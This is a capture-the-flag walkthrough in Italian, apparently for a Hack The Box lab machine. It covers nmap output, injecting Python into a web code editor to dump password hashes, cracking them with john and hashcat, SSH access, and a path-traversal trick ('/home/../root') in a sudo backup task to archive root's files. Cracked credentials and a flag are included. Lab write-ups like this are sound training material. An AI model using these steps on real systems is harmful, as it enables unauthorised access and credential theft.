# Code

## NMAP SCAN
Nmap scan report for 10.10.11.62
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   309.34 ms 10.10.16.1
2   112.86 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.97 seconds


noto aperte le 2 porte 22 e 5000. cerco online cosa è Gunicorn


##  Exploit

Noto che viene usato il servizio Gunicorn 20.0.4 

Provo a fuzzare un po' con il sito. immaginando ci sia flask, provo a farmi stampare gli utenti.

> print([(user.id, user.username, user.password) for user in User.query.all()])
stampo gli utenti e le password.




## PASSWORD CRACKING
### using john

> development:759b74ce43947f5f4c91aeddc3e5bad3
> martin:3de6f30c4a09c27fc71932bfc68474be

> john --wordlist /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt --format=raw-md5 pass.txt 

```
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=8
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-05-17 14:14) 0g/s 59100p/s 59100c/s 59100C/s !@#$%..sss
Session completed. 
```

### using hashcat

hash.txt:
> 759b74ce43947f5f4c91aeddc3e5bad3
> 3de6f30c4a09c27fc71932bfc68474be
 

> hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 

759b74ce43947f5f4c91aeddc3e5bad3:development              
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster     


## SSH exploit


> martin
> nafeelswordsmaster

vedo un file di backup e una cartella backups.

scarico prima il backup poi esploro

> python3 -m http.server 8080

> wget 10.10.11.62:8080/code_home_.._root_2025_May.tar.bz2 -> file vuoto
> 

> wget 10.10.11.62:8080/backups/code_home_app-production_app_2024_August.tar.bz2
>
> tar -xjvf code_home_app-production_app_2024_August.tar.bz2 
>
è la home del sito, con tanto di codice

non c'è nulla neanche nel db -> analizzo il resto.

nella cartella /backups trovo task.json -> contiene delle cartelle che verranno backuppate.

> sudo -l -> posso usare /usr/bin/backy.sh senza password -> esegue il backup della cartella specificata in task.json

---

Ipotizzo che user.txt sia in app-production dato che è un altro utente, e martin non ha la flag.

modifico task.json per scaricare /home/app-production/user.txt nel backup, e poi lo scarico in locale:

```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/user.txt"
        ],

        "exclude": [
                ".*"
        ]
}
```
> sudo /usr/bin/backy.sh task.json

> wget 10.10.11.62:8080/code_home_app-production_2025_May.tar.bz2

> tar -xjvf  code_home_app-production_2025_May.tar.bz2


# USER FLAG

2fad8d2c76c93fe868dd8c5630439ebd

# PRIVESC

uso lo stesso file per archiviare la cartella root


```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/../root"
        ],

        "exclude": [
                ".*"
        ]
}
```

eseguo

> sudo /usr/bin/backy.sh task.json

> wget 10.10.11.62:8080/code_home_.._root_2025_May.tar.bz2

> tar -xjvf code_home_.._root_2025_May.tar.bz2